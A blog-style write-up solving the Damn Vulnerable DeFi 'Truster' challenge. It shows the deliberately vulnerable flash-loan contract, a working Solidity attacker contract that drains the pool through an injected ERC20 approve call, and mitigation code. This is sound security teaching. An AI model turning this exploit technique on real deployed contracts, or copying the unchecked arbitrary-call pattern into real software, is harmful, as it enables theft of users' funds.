---
title: 'Damn Vulnerable Defi : Truster'
date: 2025-04-13
description: 'Solving the Truster challenge from Damn Vulnerable DeFi.'
tags: ['web3', 'solidity', 'ctf']
image: '/images/blog/2025/damn-vulnerable-defi-truster.png'
---

The "Truster" challenge from Damn Vulnerable DeFi v4 presents us with a flash loan implementation that contains a critical security vulnerability. In this writeup, I'll analyze the vulnerable contract, identify the flaw, explain the mechanics of the vulnerability, and demonstrate how to exploit it to drain all funds from the lending pool.

The challenge description states:

> More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
>
> The pool holds 1 million DVT tokens. You have nothing.
>
> To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

## Understanding the Contracts

Let's begin by analyzing the contracts involved in this challenge.

### TrusterLenderPool.sol

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}
```

This contract represents a simple flash loan provider with the following key elements:

1. It holds a reference to a DamnValuableToken (DVT) instance
2. It implements a `flashLoan` function that:
   - Takes an amount of tokens to borrow
   - Specifies a borrower address to receive the tokens
   - Accepts a target address and arbitrary data to execute an external call
   - Ensures that the pool's token balance doesn't decrease after the operation

## Identifying the Vulnerability

The critical vulnerability in the TrusterLenderPool contract is in the `flashLoan` function:

```solidity
token.transfer(borrower, amount);
target.functionCall(data);
```

The pool allows arbitrary external calls to be made with arbitrary data without any validation.

1. The external call is made in the context of the pool contract
2. The caller controls both the target address and the call data
3. There are no restrictions on what functions can be called or on which contracts

This vulnerability is particularly dangerous when combined with the ERC20 token standard's permission system.

**Understanding the ERC20 Approve Function**

ERC20 tokens implement a two-step transfer process for third-party transfers:

1. Approval Step: A token holder calls approve(spender, amount) to authorize another address to spend their tokens.
2. Transfer Step: The authorized spender calls transferFrom(owner, recipient, amount) to move tokens on behalf of the owner.

This separation enables complex DeFi interactions, but it becomes a security risk in this scenario. By crafting a call to the token's approve function through the pool, an attacker can grant themselves permission to transfer the pool's tokens without immediately removing any tokens (which would trigger the balance check).

When the pool executes:

```solidity
target.functionCall(data);
```

With target as the token address and data encoding the approve function call, it's equivalent to the pool itself calling:

```solidity
token.approve(attacker, amount);
```

The pool's validation only checks if its balance has decreased, not whether it has granted permissions to its tokens. Since approvals don't change balances, this attack bypasses the security check entirely.

## The Exploit

The vulnerability creates a pathway to drain all funds from the pool in a single transaction. Here's the attack strategy:

1. Call the `flashLoan` function with:
   - `amount = 0` (we don't need to borrow any tokens)
   - `borrower = attacker` (can be any address)
   - `target = token address` (we'll call the token directly)
   - `data = encoded call to approve(attacker, TOTAL_AMOUNT)` (granting ourselves approval to spend the pool's tokens)

2. After this call, we'll have permission to transfer all tokens from the pool
3. Use `transferFrom` to move all tokens from the pool to the recovery address

Let's implement this exploit:

```solidity
// Attacker contract to execute the exploit in a single transaction
contract TrusterAttacker {
    function attack(
        address poolAddress,
        address tokenAddress,
        address recoveryAddress,
        uint256 amount
    ) external {
        // Cast to appropriate contract types
        TrusterLenderPool pool = TrusterLenderPool(poolAddress);
        DamnValuableToken token = DamnValuableToken(tokenAddress);

        // Prepare data for the approve function call
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),  // Approve our contract
            amount
        );

        // Execute the flash loan with malicious data
        pool.flashLoan(0, address(this), tokenAddress, data);

        // Transfer all tokens to the recovery address
        token.transferFrom(poolAddress, recoveryAddress, amount);
    }
}

// In the test function
function test_truster() public checkSolvedByPlayer {
    // Deploy the attacker contract before player actions start
    TrusterAttacker attacker = new TrusterAttacker();

    // The checkSolvedByPlayer modifier activates vm.startPrank(player) here

    // Call the attack function which executes everything in a single transaction
    attacker.attack(
        address(pool),
        address(token),
        recovery,
        TOKENS_IN_POOL
    );
}
```

## Deep Dive: How the Exploit Works

Let's break down the exploit in more detail:

**Step 1: Crafting the Malicious Call Data**

```solidity
bytes memory data = abi.encodeWithSignature(
    "approve(address,uint256)",
    address(this),
    amount
);
```

Here we're using the ABI encoding functions to create a call to the ERC20 token's `approve` function. This call, when executed, will approve our contract to spend `amount` tokens on behalf of the caller. Since this call will be executed by the pool (through `target.functionCall(data)`), it will approve our contract to spend the pool's tokens.

**Step 2: Executing the Flash Loan with Malicious Data**

```solidity
pool.flashLoan(0, address(this), tokenAddress, data);
```

When we call `flashLoan`, the following happens:
1. The pool records its initial balance: `balanceBefore = token.balanceOf(address(this))`
2. It transfers 0 tokens to us (since we specified `amount = 0`)
3. It calls `target.functionCall(data)`, which executes our malicious approve call
4. It checks if its balance has decreased, which it hasn't since we borrowed 0 tokens
5. The function succeeds, but now our contract has approval to spend the pool's tokens

**Step 3: Transferring the Tokens**

```solidity
token.transferFrom(poolAddress, recoveryAddress, amount);
```

With the approval obtained in Step 2, we can now use the token's `transferFrom` function to move tokens from the pool to the recovery address. This completes our attack and fulfills the challenge requirement of rescuing all tokens from the pool.

## Mitigation Strategies

To fix this vulnerability, several approaches could be taken:

1. **Remove arbitrary calls**: The simplest fix is to remove the ability to make arbitrary external calls entirely:

```solidity
function flashLoan(uint256 amount, address borrower)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);

    // Require immediate repayment
    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

2. **Restrict call targets**: If external calls are necessary, limit them to a specific set of approved addresses:

```solidity
mapping(address => bool) public approvedTargets;

function setApprovedTarget(address target, bool approved) external onlyOwner {
    approvedTargets[target] = approved;
}

function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    require(approvedTargets[target], "Target not approved");
    // Rest of the function...
}
```

3. **Analyze call data**: Implement function signature checking to only allow specific function calls:

```solidity
bytes4 private constant ALLOWED_SIGNATURE = bytes4(keccak256("validFunction(address,uint256)"));

function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    require(bytes4(data[:4]) == ALLOWED_SIGNATURE, "Function not allowed");
    // Rest of the function...
}
```

## Conclusion

The Truster challenge demonstrates how a seemingly innocent feature—allowing external calls in a flash loan—can lead to a catastrophic loss of funds. The vulnerability exploits the permission model of ERC20 tokens, where approvals can be granted separately from actual transfers.

This is particularly instructive for DeFi developers as it shows that secure smart contract design must consider not just direct fund transfers but all possible state changes that might affect a contract's security posture. It also emphasizes the danger of implementing functionality that exceeds what is strictly necessary.
